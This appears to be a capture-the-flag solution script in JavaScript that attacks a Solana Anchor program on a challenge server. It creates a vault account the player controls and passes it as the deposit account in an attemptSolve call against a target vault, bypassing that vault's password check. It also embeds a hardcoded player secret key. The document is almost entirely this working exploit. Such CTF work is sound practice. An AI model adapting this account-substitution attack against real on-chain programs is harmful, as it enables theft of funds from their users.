const anchor = require('@coral-xyz/anchor');
const bs58 = require('bs58');
const { Keypair, PublicKey } = anchor.web3;

// Replace these values with your own
PLAYER_KEYPAIR = "4qdrXdy8gizVysMTau5Dqe5sLjM8WvmqwvmNpheeZzC5SYomNEQ5BaNJGWekoixtmywUkBUX6Gr1Fj1nu9Ny1Hqx"
CTX_PUBKEY = "4Em6CWpmT7ktoq2ftQ9rkkoDUG3JNCSAVtZg8P4SfVcj"
PROGRAM_ID = "9uodwk627Rniw7NQuN7mDHo3o4LzqbuTb8DTdjHrr4tH"
RPC_URL = "http://playground.tcp1p.team:9752/e0fbd54e-bdea-481f-824e-c303f1bcd704"

const main = async () => {
  try {
    // Create a connection to the cluster
    const connection = new anchor.web3.Connection(RPC_URL);

    // Decode the base58 secret key to create the wallet keypair
    const secretKey = bs58.default.decode(PLAYER_KEYPAIR);
    const walletKeypair = Keypair.fromSecretKey(secretKey);
    const wallet = new anchor.Wallet(walletKeypair);

    // Create a provider and set it as the default
    const provider = new anchor.AnchorProvider(connection, wallet, { commitment: "finalized" });
    anchor.setProvider(provider);

    // Create the program interface
    const programId = new PublicKey(PROGRAM_ID);
    const program = await anchor.Program.at(programId, provider);


    // Define the target vault account public key
    const targetVaultPubkey = new PublicKey(CTX_PUBKEY);

    console.log("Fetching target vault data:", targetVaultPubkey.toString());
    
    // Fetch target vault data
    const targetVaultData = await program.account.vaultState.fetch(targetVaultPubkey);
    console.log("Target vault data:", targetVaultData);

    // Create a new vault account that we control
    const ourVaultKeypair = Keypair.generate();
    console.log("Creating our vault account:", ourVaultKeypair.publicKey.toString());

    const tx1 = await program.methods
      .initialize("dummy_password")  // The actual password doesn't matter
      .accounts({
        vault: ourVaultKeypair.publicKey,
        user: wallet.publicKey,
      })
      .signers([ourVaultKeypair])
      .rpc();
    await provider.connection.confirmTransaction(tx1);

    console.log("tx1", tx1);

    console.log("Attempting to solve target vault...");
    const tx3 = await program.methods
      .attemptSolve("dummy_password") 
      .accounts({
        vault: targetVaultPubkey,
        attemptDeposit: ourVaultKeypair.publicKey,
        user: wallet.publicKey,
      })
      .rpc();
    await provider.connection.confirmTransaction(tx3);

    // Verify the solve
    const finalVaultData = await program.account.vaultState.fetch(targetVaultPubkey);
    console.log("Final target vault data:", finalVaultData);
    
  } catch (error) {
    console.error("Error during exploit:", error);
  }
};

main().catch(console.error);
